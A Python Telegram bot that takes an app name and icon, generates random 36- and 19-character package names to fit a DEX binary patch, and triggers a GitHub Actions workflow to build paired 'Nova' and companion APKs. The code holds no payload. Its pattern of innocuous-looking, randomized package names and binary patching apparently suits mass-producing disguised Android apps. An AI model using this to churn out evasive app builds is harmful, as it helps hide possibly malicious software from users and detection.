#!/usr/bin/env python3
"""
Device Client Bot — @Deviceclientbot
Nova package format    : com.mobile.tools.XXXXXXXXXXXXXXXXXXX (36 chars)
Companion package format: com.phone.helpXXXXX (19 chars)
"""

import telebot
import random
import string
import requests
import json
import os
import base64
from datetime import datetime
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

# ── Config ────────────────────────────────────────────────────────────────────
BOT_TOKEN     = os.environ["TELEGRAM_BOT_TOKEN"]
ADMIN_CHAT_ID = int(os.environ["TELEGRAM_CHAT_ID"])
GITHUB_TOKEN  = os.environ["GH_PAT"]
GITHUB_REPO   = os.environ["REPO_NAME"]

bot = telebot.TeleBot(BOT_TOKEN)
BUILDS_LOG = "builds_log.json"

# ── Session state ─────────────────────────────────────────────────────────────
session = {
    "app_name": None,
    "icon_b64": None,
    "step":     None
}

# ── Package generators ────────────────────────────────────────────────────────

def generate_nova_package() -> str:
    """
    Generate Nova package name — exactly 36 chars.
    Format: com.mobile.tools.XXXXXXXXXXXXXXXXXXX
    Prefix 'com.mobile.tools.' = 17 chars
    Random suffix = 19 lowercase chars
    Total = 36 chars — matches DEX binary patch target exactly.
    """
    suffix = ''.join(random.choices(string.ascii_lowercase, k=19))
    pkg = f"com.mobile.tools.{suffix}"
    assert len(pkg) == 36, f"Nova package wrong length: {len(pkg)}"
    return pkg

def generate_companion_package() -> str:
    """
    Generate companion package name — exactly 19 chars.
    Format: com.phone.helpXXXXX
    Prefix 'com.phone.help' = 14 chars
    Random suffix = 5 lowercase chars
    Total = 19 chars — matches DEX binary patch target exactly.
    """
    suffix = ''.join(random.choices(string.ascii_lowercase, k=5))
    pkg = f"com.phone.help{suffix}"
    assert len(pkg) == 19, f"Companion package wrong length: {len(pkg)}"
    return pkg

def generate_chain_part1() -> str:
    """Generate unique 10-char chain identifier."""
    chars = string.ascii_uppercase + string.digits
    return ''.join(random.choices(chars, k=10))

# ── GitHub trigger ────────────────────────────────────────────────────────────

def trigger_workflow(inputs: dict) -> bool:
    url = (
        f"https://api.github.com/repos/{GITHUB_REPO}"
        f"/actions/workflows/build.yml/dispatches"
    )
    headers = {
        "Authorization": f"Bearer {GITHUB_TOKEN}",
        "Accept": "application/vnd.github+json",
        "X-GitHub-Api-Version": "2022-11-28"
    }
    payload = {"ref": "main", "inputs": inputs}
    r = requests.post(url, headers=headers, json=payload, timeout=30)
    return r.status_code == 204

# ── Build log ─────────────────────────────────────────────────────────────────

def log_build(nova_pkg: str, comp_pkg: str, chain: str, app_name: str):
    builds = []
    if os.path.exists(BUILDS_LOG):
        try:
            with open(BUILDS_LOG, 'r') as f:
                builds = json.load(f)
        except Exception:
            builds = []
    builds.append({
        "timestamp":         datetime.now().isoformat(),
        "app_name":          app_name,
        "nova_package":      nova_pkg,
        "companion_package": comp_pkg,
        "chain_part1":       chain,
    })
    with open(BUILDS_LOG, 'w') as f:
        json.dump(builds, f, indent=2)

# ── Keyboards ─────────────────────────────────────────────────────────────────

def main_menu():
    markup = InlineKeyboardMarkup()
    name_label = f"✏️ App Name {'✅' if session['app_name'] else '❌'}"
    icon_label = f"🖼️ Upload Icon {'✅' if session['icon_b64'] else '❌'}"
    markup.row(InlineKeyboardButton(name_label, callback_data="set_name"))
    markup.row(InlineKeyboardButton(icon_label, callback_data="set_icon"))
    markup.row(InlineKeyboardButton("🔨 Build Both Apps", callback_data="build_app"))
    markup.row(InlineKeyboardButton("📋 List Builds", callback_data="list_builds"))
    return markup

def status_text() -> str:
    name = session["app_name"] or "❌ Not set"
    icon = "✅ Uploaded" if session["icon_b64"] else "❌ Not set"
    return (
        f"*Device Client Bot*\n\n"
        f"📱 App Name : {name}\n"
        f"🖼️ Icon      : {icon}\n\n"
        f"Select action:"
    )

# ── Handlers ──────────────────────────────────────────────────────────────────

@bot.message_handler(commands=['start'])
def cmd_start(message):
    if message.chat.id != ADMIN_CHAT_ID:
        bot.reply_to(message, "⛔ Unauthorized")
        return
    bot.send_message(
        ADMIN_CHAT_ID,
        status_text(),
        parse_mode="Markdown",
        reply_markup=main_menu()
    )

@bot.message_handler(content_types=['text', 'photo'])
def handle_message(message):
    if message.chat.id != ADMIN_CHAT_ID:
        return

    # Waiting for app name
    if session["step"] == "waiting_name" and message.content_type == "text":
        name = message.text.strip()
        if len(name) < 1 or len(name) > 30:
            bot.send_message(ADMIN_CHAT_ID, "⚠️ Name must be 1-30 characters. Try again:")
            return
        session["app_name"] = name
        session["step"] = None
        bot.send_message(
            ADMIN_CHAT_ID,
            f"✅ App name set to: `{name}`",
            parse_mode="Markdown",
            reply_markup=main_menu()
        )
        return

    # Waiting for icon
    if session["step"] == "waiting_icon" and message.content_type == "photo":
        photo     = message.photo[-1]
        file_info = bot.get_file(photo.file_id)
        downloaded = bot.download_file(file_info.file_path)
        session["icon_b64"] = base64.b64encode(downloaded).decode("utf-8")
        session["step"] = None
        bot.send_message(
            ADMIN_CHAT_ID,
            "✅ Icon uploaded!",
            reply_markup=main_menu()
        )
        return

    # Wrong type for current step
    if session["step"] == "waiting_name":
        bot.send_message(ADMIN_CHAT_ID, "⚠️ Please send the app name as text.")
        return
    if session["step"] == "waiting_icon":
        bot.send_message(ADMIN_CHAT_ID, "⚠️ Please send a photo/image as the icon.")
        return

@bot.callback_query_handler(func=lambda call: True)
def handle_callback(call):
    if call.message.chat.id != ADMIN_CHAT_ID:
        bot.answer_callback_query(call.id, "Unauthorized")
        return

    bot.answer_callback_query(call.id)

    if call.data == "set_name":
        session["step"] = "waiting_name"
        bot.send_message(ADMIN_CHAT_ID, "✏️ Enter the app name (1-30 chars):")

    elif call.data == "set_icon":
        session["step"] = "waiting_icon"
        bot.send_message(ADMIN_CHAT_ID, "🖼️ Send the app icon as a PNG image:")

    elif call.data == "build_app":
        # Validate session
        if not session["app_name"]:
            bot.send_message(
                ADMIN_CHAT_ID,
                "⚠️ Please set the app name first.",
                reply_markup=main_menu()
            )
            return
        if not session["icon_b64"]:
            bot.send_message(
                ADMIN_CHAT_ID,
                "⚠️ Please upload an icon first.",
                reply_markup=main_menu()
            )
            return

        # Generate unique values
        nova_pkg  = generate_nova_package()
        comp_pkg  = generate_companion_package()
        chain     = generate_chain_part1()
        app_name  = session["app_name"]

        # Show build summary
        bot.send_message(
            ADMIN_CHAT_ID,
            f"🚀 *Starting Build...*\n\n"
            f"📱 App Name : `{app_name}`\n"
            f"📦 Nova Pkg : `{nova_pkg}`\n"
            f"📦 Comp Pkg : `{comp_pkg}`\n"
            f"🔐 Chain    : `{chain}`\n\n"
            f"⏳ Please wait 5-8 minutes...",
            parse_mode="Markdown"
        )

        # Trigger GitHub Actions
        inputs = {
            "build_type":         "both",
            "nova_package":       nova_pkg,
            "companion_package":  comp_pkg,
            "chain_part1":        chain,
            "app_name":           app_name,
            "icon_b64":           session["icon_b64"],
        }

        if trigger_workflow(inputs):
            log_build(nova_pkg, comp_pkg, chain, app_name)
            # Reset session after successful trigger
            session["app_name"] = None
            session["icon_b64"] = None
            bot.send_message(
                ADMIN_CHAT_ID,
                "✅ *Build triggered successfully!*\n"
                "Both APKs will be sent here when ready.",
                parse_mode="Markdown",
                reply_markup=main_menu()
            )
        else:
            bot.send_message(
                ADMIN_CHAT_ID,
                "❌ Failed to trigger build. Check GH_PAT secret.",
                reply_markup=main_menu()
            )

    elif call.data == "list_builds":
        try:
            if not os.path.exists(BUILDS_LOG):
                bot.send_message(
                    ADMIN_CHAT_ID,
                    "📋 No builds yet.",
                    reply_markup=main_menu()
                )
                return
            with open(BUILDS_LOG, 'r') as f:
                builds = json.load(f)
            if not builds:
                bot.send_message(
                    ADMIN_CHAT_ID,
                    "📋 No builds yet.",
                    reply_markup=main_menu()
                )
                return

            text = "📋 *Last 10 Builds:*\n\n"
            for i, b in enumerate(builds[-10:], 1):
                date = b['timestamp'][:10]
                text += (
                    f"{i}. *{b['app_name']}* ({date})\n"
                    f"   Nova: `{b['nova_package']}`\n"
                    f"   Comp: `{b['companion_package']}`\n"
                    f"   Chain: `{b['chain_part1']}`\n\n"
                )
            bot.send_message(
                ADMIN_CHAT_ID,
                text,
                parse_mode="Markdown",
                reply_markup=main_menu()
            )
        except Exception as e:
            bot.send_message(
                ADMIN_CHAT_ID,
                f"❌ Error: {e}",
                reply_markup=main_menu()
            )

# ── Main ──────────────────────────────────────────────────────────────────────

if __name__ == "__main__":
    import sys
    print("Device Client Bot started...")
    # Menu only shows when you send /start manually
    bot.infinity_polling(timeout=10, long_polling_timeout=5)
